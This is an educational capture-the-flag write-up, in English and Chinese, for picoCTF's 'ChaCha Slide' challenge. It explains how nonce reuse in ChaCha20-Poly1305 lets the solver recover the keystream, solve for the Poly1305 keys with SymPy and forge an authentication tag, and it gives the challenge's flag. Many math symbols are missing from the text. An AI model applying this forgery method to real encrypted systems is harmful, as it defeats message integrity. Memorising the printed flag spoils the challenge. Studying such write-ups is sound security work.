The Logic: "Humans type too slowly. We cannot copy, calculate, and paste before the connection resets. Therefore, we must delegate the talking to a script."
The Solution: "We use pwntools as our automated messenger to grab the data and hold the connection open while we do the math."
Phase 2: The Scramble Pattern (Why we use XOR)
The Observation: "The server made a fatal error: it used the same Nonce twice in one session. This means it used the exact same 'scramble pattern' (keystream) for both messages."
The Logic: "If I have the original readable text and the scrambled text, I can mathematically compare them to isolate the scramble pattern itself."
The Solution: "We use a simple bitwise operation (XOR). Plaintext XOR Ciphertext = Scramble Pattern. Now we can use this pattern to scramble our own fake message."
Phase 3: The Math Wall (Why we need sympy)
The Observation: "Even with the right scrambled text, the server checks a 'digital wax seal' (the Tag). If the seal is wrong, it rejects the message."
The Logic: "The seal is built using high-level polynomial algebra. Standard Python code cannot solve unknown variables in an equation. We need a mathematical engine."
The Solution: "We feed the two seals the server gave us into sympy. By subtracting one equation from the other, we cancel out one unknown variable and force the engine to solve for the remaining one."
Phase 4: The Missing Pieces (Why we use a for loop)
The Observation: "When we ask sympy to solve the equation, it fails. Why? Because the server chopped off the top part of the numbers before sending us the seal (truncation)."
The Logic: "The math engine is trying to solve a puzzle with missing pieces. Since we know exactly how many bits were chopped off, the number of possible missing pieces is small."
The Solution: "We write a for loop to test the 7 possible missing variations. We add them back to the equation one by one until the math engine spits out the correct key."

The Core Takeaways (Take-Home Messages)
For a 13-year-old, the value of this challenge is not in memorizing the sympy syntax, but in abstracting the engineering and security principles.
The Fragility of Cryptography (Mechanisms over Magic)
A system is only as secure as its implementation. ChaCha20-Poly1305 is military-grade encryption, but reusing a single variable (the Nonce) causes the entire mathematical fortress to collapse. Security is not a magic shield; it is a strict set of rules that cannot be bypassed.
The Division of Labor (First Principles of Tooling)
Humans are good at logic; computers are good at execution. The takeaway is learning what to delegate:
The human spots the logical flaw (Nonce reuse) and sets up the equations.
pwntools handles the physical layer (socket speed).
sympy handles the execution layer (algebraic computation).
The Gap Between Theory and Reality (Boundary Conditions)
In textbooks, math equations balance perfectly. In real-world software, data gets truncated or optimized. When a logical script fails, the next step is not to abandon the logic, but to identify the physical constraints of the system (like the 128-bit cutoff) and compensate for them systematically.

Learning Material Breakdown: ChaCha Slide
Q1: Where was the flag hidden?
Storage Location: Inside the flag.txt file on the remote server (activist-birds.picoctf.net:65433).
Trigger Condition: The program logic dictates if goal in repr(user_message): print(flag). The server only returns the flag if a constructed payload (containing the target ciphertext, a valid MAC tag, and the current connection's nonce) is sent and successfully passes the decrypt_and_verify check. Based on the terminal screenshot, the extracted flag is picoCTF{7urn_17_84ck_n0w_3adcff8e}.
Q2: What were the "tricky" parts of this challenge?
Vulnerability Point (Nonce Reuse): The server statically generates nonce = secrets.token_bytes(12) once per session but calls the ChaCha20_Poly1305.new() instance multiple times to encrypt different messages. This causes the underlying stream cipher's keystream ( ) and the Poly1305 authentication polynomial parameters ( ,  ) to be reused.
Precision Truncation Handling: Poly1305 authentication operations occur within the prime field  , but the output Tag is forcibly truncated to 128 bits ( ). When reverse-engineering the polynomial equation, the lost high-order bits must be compensated for by enumerating the modulus deviations; otherwise, finding the correct roots in that finite field is mathematically impossible.
Finite Field Polynomial Root Finding: This involves solving high-degree algebraic equations over a prime field. Standard programming data types cannot handle this directly, making specialized algebraic computation engines (like SymPy or SageMath) mandatory.
Q3: How did we successfully get the flag?
Extracting Keystream: By XORing the known plaintext and its corresponding ciphertext provided by the server ( ), the keystream ( ) tied to that fixed Nonce was extracted.
Constructing Target Ciphertext: The target plaintext (But it's only secure if used correctly!) was XORed with the corresponding length of the extracted keystream to generate a valid target ciphertext ( ).
Solving for Authentication Variables (  and  ):
Using two sets of ciphertexts and Tags from the server, $s$ was eliminated to construct a polynomial difference equation: $C1_{poly}(r) - C2_{poly}(r) \equiv Tag_1 - Tag_2 \pmod{2^{130}-5}$.
Using the SymPy library, the deviations caused by the $2^{128}$ truncation were enumerated, and the roots of this equation were solved in $GF(2^{130}-5)$, recovering the key $r$.
Substituting $r$ back into the first message's Poly1305 calculation allowed for the recovery of $s$.
Forging the Authentication Tag: Using the fully recovered ( ,  ) pair, the corresponding valid Poly1305 Tag was calculated for the constructed target ciphertext  .
Assembly and Submission:  , the forged Tag, and the Nonce were concatenated into a binary byte stream and sent back to the server, successfully passing the AEAD integrity check.
Q4: What commands did we use?
Based on the environment variables shown in the screenshot, the required commands were:
Install Dependencies: pip install pwntools sympy (for socket interaction and algebraic calculations).
Execute Script: python3 hard.py (the screenshot indicates the solver code was saved as hard.py and executed via Python 3).
Q5: Any mistake or wrong path did we explore?
Given the cryptographic mechanisms involved, the most likely points of failure or logical errors in this exploit path include:
Attempting to Derive the ChaCha20 Master Key: Trying to reverse-engineer the 256-bit master key via a known-plaintext attack. The state space is too large for brute-forcing, which deviates from the necessary premise of simply extracting the single-use  .
Ignoring Tag Verification: Forging only the target ciphertext and sending it back. Because ChaCha20-Poly1305 is an AEAD (Authenticated Encryption with Associated Data) cipher, if the authentication tag is incorrect, decrypt_and_verify throws a ValueError and terminates the process before reaching the decryption logic.
Omitting Finite Field Modulus Compensation: Failing to map the truncated 128-bit Tag back into the original mathematical space of   when using SymPy to solve for  . Without adding the deviation offset + K * (1 << 128), the polynomial root-finding yields no solution or an invalid   value.
Sampling Across Multiple Connections: Attempting to disconnect and reconnect to gather multiple comparison datasets. Since the server generates a brand new 32-byte Key and 12-byte Nonce upon every TCP handshake, data capture and payload submission must be completed strictly within the context of a single active connection.
学习材料拆解：ChaCha Slide
Q1: Where was the flag hidden?
存储位置: 服务端 (activist-birds.picoctf.net:65433) 环境内的 flag.txt 文件中。
触发条件: 程序逻辑设定为 if goal in repr(user_message): print(flag)。必须向服务端发送一段构造的数据（包含目标明文密文、合法的校验标签与当前连接的 Nonce），且服务端通过 decrypt_and_verify 验证并解密成功后才会返回。根据终端截图，最终提取的 Flag 值为 picoCTF{7urn_17_84ck_n0w_3adcff8e}。
Q2: What were the "tricky" parts of this challenge?
漏洞利用点 (Nonce 滥用): 服务端在单次会话中固定生成了 nonce = secrets.token_bytes(12)，但多次调用 ChaCha20_Poly1305.new() 实例加密不同的消息。这导致底层流密码的密钥流 ( ) 和 Poly1305 认证多项式参数 ( ,  ) 被重复使用。
精度截断 (Truncation) 处理: Poly1305 的认证运算是在素数域   内进行的，但输出的 Tag 被强制截断为 128 位 ( )。在逆向求解多项式方程时，必须通过枚举变量补偿高位丢失的模数偏差，否则无法在该有限域内求出正确的根。
有限域多项式求根机制: 涉及高阶多项式在素数域上的代数求解，常规编程语言基础数据类型无法直接处理，强制依赖专门的代数计算引擎（如 SymPy 或 SageMath）。
Q3: How did we successfully get the flag?
提取密钥流: 利用服务端输出的已知明文和对应密文，通过异或运算 ( ) 提取出该固定 Nonce 下的密钥流 ( )。
构造目标密文: 将目标明文（But it's only secure if used correctly!）与等长的提取密钥流进行异或，生成合法的目标密文 ( )。
联立方程求解认证变量 (  和  ):
提取服务端给出的两组密文与 Tag，消去 $s$ 后构造多项式差值方程：$C1_{poly}(r) - C2_{poly}(r) \equiv Tag_1 - Tag_2 \pmod{2^{130}-5}$。
利用 SymPy 库枚举由于 $2^{128}$ 截断引发的偏差，在 $GF(2^{130}-5)$ 内对上述方程求根，从而恢复密钥 $r$。
将求得的 $r$ 代回第一组消息的 Poly1305 计算公式中，反解出变量 $s$。
伪造校验标签: 使用完全恢复的 ( ,  )，为已构造的目标密文   计算出其对应的合法 Poly1305 Tag。
组装与提交通道: 将  、伪造的 Tag 和对应的 Nonce 拼接成二进制字节流，通过网络信道发回服务端，通过 AEAD 完整性校验。
Q4: What commands did we use?
根据截图反馈的环境变量，执行此过程所需的指令为：
安装依赖: pip install pwntools sympy (用于 Socket 交互与代数系统计算)。
执行运算: python3 hard.py (从终端截图可见，破解代码被保存为 hard.py 并在 Python 3 下运行)。
Q5: Any mistake or wrong path did we explore?
基于此机制的脆弱性，此路径中最易触发的计算错误和逻辑失效点包括：
尝试推导 ChaCha20 主密钥: 尝试通过已知明文攻击反推 256 位的主 key。其状态空间过大无法暴力破解，偏离了只需提取单次   的前提。
忽略标签验证 (Tag Verification): 仅伪造了目标密文并发回。ChaCha20-Poly1305 作为 AEAD（认证加密），若校验标签不符，decrypt_and_verify 会直接抛出 ValueError 并中断进程，无法到达解密验证逻辑。
遗漏有限域模数补偿: 在使用 SymPy 求解   时，未将截断的 128 位 Tag 投射回   的原始数学空间。若不加入 + K * (1 << 128) 的偏差偏移量，会导致多项式求根无解或解出无效的   值。
跨越连接取样: 试图通过重新连接服务端来获取多组比对数据。由于服务端每次 TCP 握手后都会生成全新的 32 字节 Key 与 12 字节 Nonce，必须在单次连接维持的上下文中完成数据捕获与 Payload 反向提交。


